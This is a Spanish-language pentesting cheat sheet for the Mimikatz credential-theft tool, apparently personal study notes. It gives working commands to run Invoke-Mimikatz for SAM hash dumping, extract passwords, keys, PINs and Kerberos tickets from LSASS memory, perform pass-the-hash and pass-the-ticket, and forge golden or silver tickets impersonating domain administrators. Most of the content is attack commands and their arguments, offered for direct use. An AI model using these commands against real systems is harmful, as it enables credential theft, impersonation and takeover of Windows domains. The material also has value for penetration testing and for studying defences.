# MIMIKATZ

en la maquina atacante (parrot)ubicamos el mimikatz

```
locate Invoke-Mimikatz.ps1
```

usaremos el de nishang

pasarse ese archio a la maquina atacante mediante algun metodo

antes editar el archivo Invoke-mimikatz.ps1 agregando al final la siguiente linea

```
Invoke-Mimikatz -Command "token::elevate"
```
y despues volemos a ejecutar el mimikatz cambiando la linea a 

```
Invoke-Mimikatz -Command "lsadump::sam"
```

con esto obtenemos los hashes SAM

todo esto administradores del sistema

## EXPLICACION DE MIMIKATZ

permite la extraccion de contraseñas, hashes, pines, tickets de kerberos y crear golden tickets.

sintaxys:

```
modulename::commandname arguments...
```

## MODULOS

* standard
* privilege
* crypto
* sekurlsa
* kerberos
* lsadump
* vault
* token
* event
* ts
* process
* service
* net
* misc
* library mimilib
* driver mimidrv

**modulo standar**

Este es el módulo principal de mimikatz, contiene comandos rápidos para operar con la herramienta.

Para este en particular, no es necesario prefijar el comando con el nombre del módulo (pero también funciona)

```
exit -> cierra el mimikatz

cls -> limpia la pantalla

coffee -> impriime un cafecito

sleep [milisegundos] -> duerme la cantidad de milisegundos establecido

log  -> Registra todas las salidasen un archivo mimikatz.log
log filename.log -> Registra todas las salidas en otro archivo establecido
log /stop -> detiene el registro de los logs

version -> muestra la version del mimikatz

cd -> muestra el directorio actual
cd /path/... -> cambia el directorio
```

**modulo privilege**

verifica sii tiene los permisos necesarios

```
privilege::debug -> verificar sii tiene los permisos necesarios OK
```

es mejor estar con un usuario administrador para usar esto

El privilegio de depuración permite depurar un proceso al que normalmente no tendrían acceso.

**modulo sekurlsa**

Este módulo extrae contraseñas , claves , códigos pin , tickets de la memoria de lsass( Local Security Authority Subsystem Service)

Cuando se trabaja con el lsass se necesita tener rol administrador o de sistema (system)
y ejecutar el "privilege::debug"

Sin derechos de acceso al lsass, todos los comandos fallarán con un error como este: **ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)**

Entonces, se debe comenzar con:

```
privilege::debug

log sekurlsa.log
```

La información que se puede extraer depende de la versión de Windows y los métodos de autenticación

**A partir de Windows 8.xy 10, de forma predeterminada , no hay contraseña en la memoria.**

```
sekurlsa::logonpasswords -> enumera todas las credenciales de proveedor disponibles. Los de inicio de sesion.
```

pass the hash (requiere privilegios -> privilege::degub)

Mediante el hash NTLM

```
sekurlsa::pth /user:<usuario> /domain:<dominio> /ntlm:<hash-NTLM>
```

enumerar y exportar tickets de kerberos

sekurlsa utiliza lectura de memoria y no está sujeto a restricciones de exportación de claves

sekurlsa puede acceder a tickets de otras sesiones (usuarios).

```
sekurlsa::tickets /export

/export es opcional 
los tickets se exportan en .kirbi
Comienzan con el número de usuario LUIDy grupo ( 0= TGS, 1= client ticket(?) Y 2= TGT)
```

enumera las claves de cifrado de Kerberos

se obtiene el aes256_HMAC y las claves rc4

```
sekurlsa::ekeys
```

lista MasterKeys en caché

```
sekurlsa::dpapi
```

Al utilizar el inicio de sesión con tarjeta inteligente en el dominio, lsassalmacena en caché el código PIN de la tarjeta inteligente

obtener el pin de kerberos

```
sekurlsa::kerberos
```

**modulo kerberos**

Este módulo se puede utilizar sin ningún privilegio. Permite jugar con la API oficial de Microsoft Kerberos

[http://msdn.microsoft.com/library/windows/desktop/aa378099.aspx](http://msdn.microsoft.com/library/windows/desktop/aa378099.aspx)

y crear 'boletos dorados' sin conexión, boletos gratuitos de larga duración TGT para cualquier usuario





ptt

Inyecta uno o varios tickets de Kerberos en la sesión actual ( TGT o TGS).

* filename - el nombre de archivo del ticket (puede ser múltiple)
* diretory- una ruta de directorio, .kirbi se inyectarán todos los archivos dentro.

```
kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi
```

golden - silver

Este comando crea un ticket Kerberos, a TGTo a TGScon datos arbitrarios, para cualquier usuario que desee, en los grupos que desee ... (por ejemplo: el administrador del dominio).

argumentos:

* /domain = dominio
* /sid = el SID del dominio (por ejemplo:) S-1-5-21-130452501-2365100805-3685010670.
* /user = el nombre de usuario que desea suplantar
* /id = (opcional) la identificación del usuario valor predeterminado (500 - administrador)
* /groups = (opcional) id de los grupos al que pertenece el usuario (primero es el grupo principal, separador de comas) el valor predeterminado es: 513,512,520,518,519para los grupos de administradores conocidos.




